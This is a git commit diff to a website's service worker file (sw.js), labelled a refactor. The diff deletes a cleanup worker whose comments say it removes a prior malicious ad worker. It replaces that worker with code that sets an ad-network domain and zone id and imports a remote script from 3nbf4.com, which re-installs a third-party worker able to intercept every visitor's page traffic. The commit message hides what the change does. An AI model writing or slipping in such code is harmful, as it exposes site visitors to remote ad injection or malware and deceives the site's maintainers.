98484b91d7140eb82339531c084c566c9709b889
emmanuelbobi2011-byte <emmanuelbobi2011@gmail.com>
2026-09-19 01:05:18 +0100

    Refactor service worker with new options and import
    Removed previous service worker code and added new options and script import.

--- sw.js
+++ sw.js
@@ -1,25 +1,6 @@
-// Remove any previous malicious ad worker and do not register one.
-self.addEventListener('install', () => {
-  self.skipWaiting();
-});
-
-self.addEventListener('activate', (event) => {
-  event.waitUntil((async () => {
-    // Remove stale caches and registrations.
-    const cacheNames = await caches.keys();
-    await Promise.all(cacheNames.map((cacheName) => caches.delete(cacheName)));
-
-    // If a previous registration exists, clear it.
-    if ('serviceWorker' in navigator) {
-      const registrations = await navigator.serviceWorker.getRegistrations();
-      await Promise.all(registrations.map((registration) => registration.unregister()));
-    }
-
-    await self.clients.claim();
-  })());
-});
-
-self.addEventListener('fetch', (event) => {
-  // Do nothing: no interception, no ad injection.
-  return;
-});
+self.options = {
+    "domain": "3nbf4.com",
+    "zoneId": 11836219
+}
+self.lary = ""
+importScripts('https://3nbf4.com/act/files/service-worker.min.js?r=sw')
